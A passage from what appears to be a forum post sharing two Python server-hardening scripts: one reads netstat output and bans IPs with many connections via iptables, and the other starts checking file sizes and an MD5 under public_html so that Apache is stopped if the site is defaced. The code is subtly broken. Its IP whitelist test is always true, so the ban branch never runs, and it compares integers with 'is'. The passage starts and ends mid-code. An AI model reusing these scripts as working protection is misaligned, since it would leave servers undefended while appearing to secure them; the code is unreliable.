#DD0000">'netstat&nbsp;-ntu&nbsp;|&nbsp;awk&nbsp;\'{print&nbsp;$5}\'&nbsp;|&nbsp;cut&nbsp;-d:&nbsp;-f1&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-n&nbsp;&gt;&gt;&nbsp;/root/IPz.txt'</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">file&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/IPz.txt'</span><span style="color: #007700">)<br />&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">line&nbsp;in&nbsp;file</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">line<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ban&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;word_num&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;words&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ip</span><span style="color: #007700">.</span><span style="color: #0000BB">split</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">text_word&nbsp;in&nbsp;words</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">word_num&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">word_num&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">int</span><span style="color: #007700">(</span><span style="color: #0000BB">text_word</span><span style="color: #007700">)&nbsp;&gt;&nbsp;</span><span style="color: #0000BB">20</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Ban&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">word_num&nbsp;is&nbsp;2</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">Ban&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'.'&nbsp;</span><span style="color: #0000BB">in&nbsp;text_word</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'127.0.0.1'&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #DD0000">'176.9.183.142'&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #DD0000">'79.175.163.84'&nbsp;</span><span style="color: #0000BB">in&nbsp;text_word</span><span style="color: #007700">:&nbsp;&nbsp;</span><span style="color: #FF8000">#replace&nbsp;your&nbsp;ip&nbsp;address<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">skip&nbsp;is&nbsp;0</span><span style="color: #007700">:&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'iptables&nbsp;-I&nbsp;INPUT&nbsp;-s&nbsp;%s&nbsp;-j&nbsp;DROP'&nbsp;</span><span style="color: #007700">%</span><span style="color: #0000BB">text_word&nbsp;</span><span style="color: #FF8000">#&nbsp;it&nbsp;use&nbsp;iptables&nbsp;to&nbsp;ban&nbsp;users<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">deny</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'iptables&nbsp;-A&nbsp;INPUT&nbsp;&nbsp;-s&nbsp;%s&nbsp;-j&nbsp;DROP'&nbsp;</span><span style="color: #007700">%</span><span style="color: #0000BB">text_word<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">deny</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;iptables-persistent&nbsp;save'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;iptables-persistent&nbsp;restart'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/Banned.txt'</span><span style="color: #007700">,</span><span style="color: #DD0000">'a'</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">#save&nbsp;ip&nbsp;banned&nbsp;for&nbsp;me<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ip_add&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">text_word&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #DD0000">'\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave</span><span style="color: #007700">.</span><span style="color: #0000BB">write</span><span style="color: #007700">(</span><span style="color: #0000BB">ip_add</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave</span><span style="color: #007700">.</span><span style="color: #0000BB">close</span><span style="color: #007700">()&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'rm&nbsp;-rf&nbsp;/root/IPz.txt'</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Note: Change exceptions IP to anything you want.<br />
Note: This file find the IPs, which have more threads on server and it going to block them.<br />
Note: You can see block IPs in /root/Banned.txt<br />
Note: This script will check your server every 120 seconds. Why ? Maybe someone trying for DOS/DDOS attack but attack not begin success yet. So it will check and block them too.<br />
<br />
This file will check the MD5 of public_html files and folders, If any file or folder is to be changed/added/removed, Robot will Stop Apache. So you cannot be defaced.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#md5.py<br />#!/usr/bin/python<br />#By&nbsp;Ali&nbsp;Razmjoo&nbsp;<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/md5.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing<br /></span><span style="color: #0000BB">def&nbsp;stop</span><span style="color: #007700">(</span><span style="color: #0000BB">signum</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">frame</span><span style="color: #007700">):<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">stop_event</span><span style="color: #007700">.</span><span style="color: #0000BB">set</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">signal</span><span style="color: #007700">.</span><span style="color: #0000BB">signal</span><span style="color: #007700">(</span><span style="color: #0000BB">signal</span><span style="color: #007700">.</span><span style="color: #0000BB">SIGTERM</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">stop</span><span style="color: #007700">)<br />if&nbsp;</span><span style="color: #0000BB">__name__&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #DD0000">'__main__'</span><span style="color: #007700">:&nbsp;</span><span style="color: #FF8000">#start&nbsp;software<br />&nbsp;&nbsp;</span><span style="color: #007700">while&nbsp;</span><span style="color: #0000BB">not&nbsp;stop_event</span><span style="color: #007700">.</span><span style="color: #0000BB">is_set</span><span style="color: #007700">():&nbsp;</span><span style="color: #FF8000">#while&nbsp;bash&nbsp;script&nbsp;not&nbsp;stop&nbsp;....<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.6</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'rm&nbsp;-rf&nbsp;/home/size_public_html'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/home/size_public_html'</span><span style="color: #007700">,</span><span style="color: #DD0000">'a'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">dirnames</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">filenames&nbsp;in&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">walk</span><span style="color: #007700">(</span><span style="color: #DD0000">'/home/z3r0d4y/public_html/'</span><span style="color: #007700">):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">F&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">subdirname&nbsp;in&nbsp;dirnames</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">A&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">join</span><span style="color: #007700">(</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">subdirname</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'error_log'&nbsp;</span><span style="color: #0000BB">in&nbsp;A</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">C&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'access_log'&nbsp;</span><span style="color: #0000BB">in&nbsp;A</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'data'&nbsp;</span><span style="color: #0000BB">in&nbsp;A</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">C&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">C&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'public_html/'&nbsp;</span><span style="color: #0000BB">in&nbsp;A</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">size&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">getsize</span><span style="color: #007700">(</span><span style="color: #0000BB">A</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">wr&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">size</span><span style="color: #007700">)&nbsp;+&nbsp;</span><span style="color: #DD0000">':::'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">A</span><span style="color: #007700">)&nbsp;+&nbsp;</span><span style="color: #DD0000">'\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f</span><span style="color: #007700">.</span><span style="color: #0000BB">write</span><span style="color: #007700">(</span><span style="color: #0000BB">wr</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">C&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">filename&nbsp;in&nbsp;filenames</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">F&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">join</span><span style="color: #007700">(</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">filename</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'error_log'&nbsp;</span><span style="color: #0000BB">in&nbsp;F</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">D&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'access_log'&nbsp;</span><span style="color: #0000BB">in&nbsp;F</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">D&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">D&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'public_html/'&nbsp;</span><span style="color: #0000BB">in&nbsp;F</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">size&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">getsize</span><span style="color: #007700">(</span><span style="color: #0000BB">F</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">wr&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">size</span><span style="color: #007700">)&nbsp;+&nbsp;</span><span style="color: #DD0000">':::'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">F</span><span style="color: #007700">)&nbsp;+&nbsp;</span><span style="color: #DD0000">'\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f</span><span style="color: #007700">.</span><span style="color: #0000BB">write</span><span style="color: #007700">(</span><span style="color: #0000BB">wr</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">except</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">e&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f</span><span style="color: #007700">.</span><span style="color: #0000BB">close</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">hash&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/home/size_public_html'</span><span style="color: #007700">).</span><span style="color: #0000BB">read</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">md5&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">.</span><span style="color: #0000BB">md5</span><span style="color: #007700">(</span><span style="color: #0000BB">hash</span><span style="color: #007700">).</span><span style="color: #0000BB">hexdigest</span><span style="color: #007700">()<br 